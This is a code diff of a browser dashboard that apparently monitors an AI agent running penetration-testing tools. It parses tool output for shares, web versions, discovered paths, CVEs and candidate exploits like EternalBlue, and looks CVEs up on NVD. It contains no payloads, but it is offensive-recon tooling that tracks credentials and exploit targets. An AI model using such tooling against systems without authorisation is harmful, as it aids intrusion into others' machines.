-  // smbclient -L style: "  ShareName    Disk    Comment"
-  const smbShareRe = /^\s*([A-Za-z0-9_$\-]+)\s+Disk\s+(.+?)\s*$/gm;
-  let sm; while ((sm = smbShareRe.exec(L)) !== null && sm[1] !== "Sharename") {
-    addIntel("shares", sm[1], "SMB · " + sm[2], src, {silent:true});
-  }
-  // nfs exports: "/srv/foo  *(rw,sync,no_subtree_check)"
-  if ((m = L.match(/^(\/\S+)\s+\*\([\w,]+\)/m)))                              addIntel("shares", m[1], "NFS export", src, {silent:true});
-
-  // Web tech
-  if ((m = L.match(/\bApache\/(\d+\.\d+(?:\.\d+)?)/i)))                       addIntel("web", "apache", m[1], src, {silent:true});
-  if ((m = L.match(/\bnginx\/(\d+\.\d+(?:\.\d+)?)/i)))                        addIntel("web", "nginx", m[1], src, {silent:true});
-  if ((m = L.match(/\bMicrosoft-IIS\/(\d+\.\d+)/i)))                          addIntel("web", "iis",    m[1], src, {silent:true});
-  if ((m = L.match(/\bPHP\/(\d+\.\d+(?:\.\d+)?)/i)))                          addIntel("web", "php",    m[1], src, {silent:true});
-  if ((m = L.match(/\b(WordPress|Drupal|Joomla|Tomcat|Jenkins|GitLab|phpMyAdmin)\b[^\n]{0,30}?(\d+\.\d+(?:\.\d+)?)?/i)))
-                                                                              addIntel("web", m[1].toLowerCase(), (m[2]||"present"), src, {silent:true});
-  // Discovered web paths (gobuster, ffuf): " /admin     (Status: 200) [Size: 1234]"
-  const pathRe = /(\/[A-Za-z0-9._\/\-]{2,80})\s+\(Status:\s*(\d{3})\)/g;
-  let pmm; while ((pmm = pathRe.exec(L)) !== null) {
-    const code = pmm[2];
-    const level = code === "200" ? "good" : code === "403" ? "warn" : code === "401" ? "warn" : "";
-    addIntel("web", pmm[1], "HTTP " + code + (level?" ("+level+")":""), src, {silent:true});
-  }
-
-  // Vulnerabilities / CVEs / explicit exploit hints
-  const cves = L.match(/\bCVE-\d{4}-\d{4,7}\b/gi);
-  if (cves) for (const c of cves) addIntel("vulns", c.toUpperCase(), "referenced in telemetry", src, {silent:true});
-  if (/\beternalblue\b/i.test(L))      addIntel("vulns", "EternalBlue (MS17-010)", "candidate exploit referenced", src, {silent:true});
-  if (/\bms17-010\b/i.test(L))         addIntel("vulns", "MS17-010", "candidate exploit referenced", src, {silent:true});
-  if (/\bshellshock\b/i.test(L))       addIntel("vulns", "Shellshock", "candidate exploit referenced", src, {silent:true});
-  if (/\bdirty\s*cow\b/i.test(L))      addIntel("vulns", "DirtyCow", "candidate exploit referenced", src, {silent:true});
-  if (/\bsudo[^\n]{0,40}\bversion\b[^\n]{0,60}\b(1\.8\.[0-9]+|1\.9\.[0-5])/i.test(L))
-                                       addIntel("vulns", "sudo (old)", "old sudo version observed — check CVE-2021-3156", src, {silent:true});
-}
-
-// hook into the existing ingestion path
-const _origParseLogLine = parseLogLine;
-parseLogLine = function(line) {
-  _origParseLogLine(line);
-  extractIntelFromLine(line, state.activeTool ? state.activeTool : "log");
-};
-const _origRenderEvent = renderEvent;
-renderEvent = function(ev) {
-  _origRenderEvent(ev);
-  if (!ev) return;
-  if (ev.type === "tool_result" && ev.text) {
-    String(ev.text).split("\n").forEach(ln => extractIntelFromLine(ln, ev.tool || "result"));
-  } else if (ev.type === "assistant_text" && ev.text) {
-    // Claude's prose often summarises findings — scan it too, but conservatively
-    extractIntelFromLine(stripMeta(ev.text), "claude");
-  }
-};
-
-// form: pin a note
-$("#intel-form").addEventListener("submit", (ev) => {
-  ev.preventDefault();
-  const fd = new FormData(ev.target);
-  const obj = Object.fromEntries(fd.entries());
-  if (!obj.key || !obj.value) return;
-  addIntel(obj.category, obj.key, obj.value, obj.source || "manual");
-  ev.target.reset();
-  $("#intel-form select[name=category]").value = "notes";
-  toast("Intel pinned");
-});
-$("#btn-intel-clear").addEventListener("click", () => {
-  if (Object.keys(state.intel).length === 0) return;
-  if (confirm("Clear all collected intel? (notes you pinned will also be removed)")) clearIntel();
-});
-
-loadIntel();
-updateIntelBadge();
-
-/* ===================================================================
-   CVE WATCHLIST — auto-detect CVE IDs + NVD lookup
-   =================================================================== */
-state.cves = {};        // CVE-ID → { id, summary, severity, score, vector, products, trail[], ts, status }
-state.cveFetching = new Set();
-const CVE_RE = /\bCVE-\d{4}-\d{4,7}\b/gi;
-
-function loadCves() {
-  try {
-    const raw = localStorage.getItem("thm-cves");
-    if (raw) state.cves = JSON.parse(raw) || {};
-  } catch { state.cves = {}; }
-}
-function saveCves() {
-  try { localStorage.setItem("thm-cves", JSON.stringify(state.cves)); } catch {}
-}
-function updateCveBadge() {
-  const n = Object.keys(state.cves).length;
-  $("#cve-badge").textContent = n;
-  $("#cve-count").textContent = n + " CVE" + (n===1?"":"s");
-}
-
-function sevClass(score) {
-  if (score == null || Number.isNaN(score)) return "loading";
-  if (score >= 9.0) return "critical";
-  if (score >= 7.0) return "high";
-  if (score >= 4.0) return "medium";
-  return "low";
-}
-function sevLabel(score) {
-  if (score == null || Number.isNaN(score)) return "—";
-  if (score >= 9.0) return "Critical";
-  if (score >= 7.0) return "High";
-  if (score >= 4.0) return "Medium";
-  return "Low";
-}
-
-async function fetchCveFromNVD(cveId) {
-  if (state.cveFetching.has(cveId)) return;
-  state.cveFetching.add(cveId);
-  const url = `https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=${encodeURIComponent(cveId)}`;
-  try {
-    const r = await fetch(url);
-    if (!r.ok) throw new Error("HTTP " + r.status);
-    const data = await r.json();
-    const item = data.vulnerabilities && data.vulnerabilities[0] && data.vulnerabilities[0].cve;
-    const rec = state.cves[cveId] || { id: cveId, trail: [], ts: Date.now() };
-    rec.status = "ok";
-    rec.ts = Date.now();
-    if (item) {
-      const descs = item.descriptions || [];
-      const en = descs.find(d => d.lang === "en") || descs[0];
-      rec.summary = en ? en.value : "";
-      // CVSS — prefer v3.1, then v3.0, then v2
-      const metrics = item.metrics || {};
-      let cvss = null, vector = "", source = "";
-      const tries = [
-        ["cvssMetricV31", "CVSS3.1"],
-        ["cvssMetricV30", "CVSS3.0"],
-        ["cvssMetricV2",  "CVSS2"],
-      ];
-      for (const [k, lbl] of tries) {
-        if (metrics[k] && metrics[k][0] && metrics[k][0].cvssData) {
-          cvss = metrics[k][0].cvssData.baseScore;
-          vector = metrics[k][0].cvssData.vectorString || "";
-          source = lbl;
-          break;
-        }
-      }
-      rec.score = cvss;
-      rec.vector = vector;
-      rec.cvss_source = source;
-      // affected products (configurations are deep; just pull CPE names)
-      const products = new Set();
-      const cfgs = item.configurations || [];
-      for (const cfg of cfgs) {
-        for (const node of (cfg.nodes || [])) {
-          for (const m of (node.cpeMatch || [])) {
-            // example: cpe:2.3:a:sudo_project:sudo:1.8.31:*:*:*:*:*:*:*
-            const parts = (m.criteria || "").split(":");
-            if (parts.length >= 6) {
-              const vendor = parts[3], product = parts[4], ver = parts[5];
-              if (vendor && product) products.add(`${vendor}/${product}${ver && ver!=="*"?" @ "+ver:""}`);
-            }
-          }
-        }
-      }
-      rec.products = Array.from(products).slice(0, 12);
-      rec.published = item.published || "";
-    } else {
-      rec.summary = "(no NVD record)";
-      rec.score = null;
-    }
-    state.cves[cveId] = rec;
-    saveCves();
-    updateCveBadge();
-    if (state.view === "cves") renderCves();
-  } catch (e) {
-    const rec = state.cves[cveId] || { id: cveId, trail: [], ts: Date.now() };
-    rec.status = "error";
-    rec.summary = "lookup failed: " + (e.message || e);
-    state.cves[cveId] = rec;
-    saveCves();
-    if (state.view === "cves") renderCves();
-  } finally {
-    state.cveFetching.delete(cveId);
-  }
-}
-
-function noteCve(cveId, sourceContext) {
-  cveId = cveId.toUpperCase();
-  let rec = state.cves[cveId];
-  const fresh = !rec;
-  if (!rec) {
-    rec = { id: cveId, summary: "looking up…", status: "loading", trail: [], ts: Date.now() };
-    state.cves[cveId] = rec;
-    pushLine({ src:"OPS", msg: `⚠ CVE detected: ${cveId} — querying NVD…`, level:"warn" });
-    fetchCveFromNVD(cveId);
-  }
-  if (sourceContext) {
-    const trim = String(sourceContext).slice(0, 140).trim();
-    if (trim && !rec.trail.includes(trim)) rec.trail.push(trim);
-    if (rec.trail.length > 6) rec.trail = rec.trail.slice(-6);
-  }
-  rec.fresh = fresh;
-  if (fresh) setTimeout(() => { rec.fresh = false; if (state.view === "cves") renderCves(); }, 2000);
-  saveCves();
-  updateCveBadge();
-  if (state.view === "cves") renderCves();
-}
-
-function renderCves() {
-  const body = $("#cve-body");
-  body.innerHTML = "";
-  const list = Object.values(state.cves);
-  if (!list.length) {
-    body.appendChild(el("div", { class:"h-label", style:"color:var(--fg-dim);" },
-      "No CVEs surfaced yet. The HUD watches the telemetry for CVE-IDs and looks each one up automatically from NVD."));
-    return;
-  }
-  // sort by severity desc, then by id desc
-  list.sort((a,b) => {
-    const sa = (a.score==null) ? -1 : a.score;
-    const sb = (b.score==null) ? -1 : b.score;
-    if (sa !== sb) return sb - sa;
-    return (b.id || "").localeCompare(a.id || "");
-  });
-  for (const c of list) {
-    const sc = sevClass(c.score);
-    const card = el("div", { class: "cve-card sev-" + sc + (c.fresh?" fresh":"") });
-    const head = el("div", { class: "cve-head" },
-      el("span", { class: "cve-id" }, c.id),
-      el("span", { class: "cve-sev-badge" }, sevLabel(c.score)),
-      el("span", {}, ""),
-      el("span", { class: "cve-score" }, c.score!=null ? c.score.toFixed(1) : (c.status==="loading"?"…":"—")),
-      el("div", { class: "cve-actions" },
-        el("button", { onclick: () => window.open("https://nvd.nist.gov/vuln/detail/" + c.id, "_blank") }, "NVD"),
-        el("button", { onclick: () => { navigator.clipboard.writeText(c.id); toast("Copied " + c.id); } }, "CP"),
-        el("button", { class: "del", onclick: () => {
-          delete state.cves[c.id]; saveCves(); updateCveBadge(); renderCves();
-        } }, "✕")
-      )
-    );
-    card.appendChild(head);
-    const cbody = el("div", { class: "cve-body" },
-      el("div", { class: "cve-summary" }, c.summary || "—")
-    );
-    if (c.vector || c.cvss_source || c.published) {
-      const meta = el("div", { class: "cve-meta" });
-      if (c.cvss_source) meta.appendChild(el("span", {}, "scoring · ", el("span", { class:"v" }, c.cvss_source)));
-      if (c.vector)      meta.appendChild(el("span", {}, "vector · ",  el("span", { class:"cve-vec" }, c.vector)));
-      if (c.published)   meta.appendChild(el("span", {}, "published · ", el("span", { class:"v" }, (c.published || "").slice(0,10))));
-      cbody.appendChild(meta);
-    }
-    if (c.products && c.products.length) {
-      const ps = el("div", { class: "cve-products" });
-      for (const p of c.products) ps.appendChild(el("span", { class: "chip" }, p));
-      cbody.appendChild(ps);
-    }
-    if (c.trail && c.trail.length) {
-      const tr = el("div", { class: "cve-trail" }, "Seen in: " + c.trail.join(" │ "));
-      cbody.appendChild(tr);
-    }
-    card.appendChild(cbody);
-    body.appendChild(card);
-  }
-}
-
-// Hook CVE detection into the same extractor that intel uses
-const _origExtractIntel = extractIntelFromLine;
-extractIntelFromLine = function(line, sourceHint) {
-  _origExtractIntel(line, sourceHint);
-  if (!line) return;
-  const matches = String(line).match(CVE_RE);
-  if (!matches) return;
-  const uniq = Array.from(new Set(matches.map(s => s.toUpperCase())));
-  for (const id of uniq) {
-    noteCve(id, line);
-  }
-};
-
-$("#cve-form").addEventListener("submit", (ev) => {
-  ev.preventDefault();
-  const fd = new FormData(ev.target);
-  const id = String(fd.get("cve") || "").trim().toUpperCase();
-  if (!/^CVE-\d{4}-\d{4,7}$/.test(id)) {
-    toast("Enter a valid CVE ID (e.g. CVE-2021-3156)", "bad");
-    return;
-  }
-  noteCve(id, "manual lookup");
-  ev.target.reset();
-  toast("Looking up " + id + "…");
-});
-$("#btn-cve-clear").addEventListener("click", () => {
-  if (Object.keys(state.cves).length === 0) return;
-  if (confirm("Clear all CVE entries?")) {
-    state.cves = {}; saveCves(); updateCveBadge(); renderCves();
-  }
-});
-
-loadCves();
-updateCveBadge();
-// re-fetch any CVE that's missing a score (e.g. saved during a previous fetch error)
-for (const id of Object.keys(state.cves)) {
-  const c = state.cves[id];
-  if (c.score == null && c.status !== "loading") fetchCveFromNVD(id);
-}
-
-/* ===================================================================
-   BOOT — initial render + polling cadence
-   =================================================================== */
-switchTool("idle");
-renderServices();
-pushLine({ src:"OPS", msg:"HUD initialized. Awaiting telemetry — start any tool against a target and the console will adapt.", level:"dim" });
-pushLine({ src:"OPS", msg:"Tip: top-right Theme toggle switches between TACTICAL and NEON.", level:"dim" });
-
-pollLogList();
+updateCredBadge();
+updatePortBadge();
+updateDirsBadge();
+pushLine("OPS", "HUD initialized — awaiting telemetry.");
 pollSessions();
-pollCreds();
-
-setInterval(pollLogList, 3000);
-setInterval(pollLogTail, 200);
 setInterval(pollSessions, 3000);
 setInterval(pollEvents, 400);
-setInterval(pollCreds, 2000);
 </script>
 </body>
 </html>
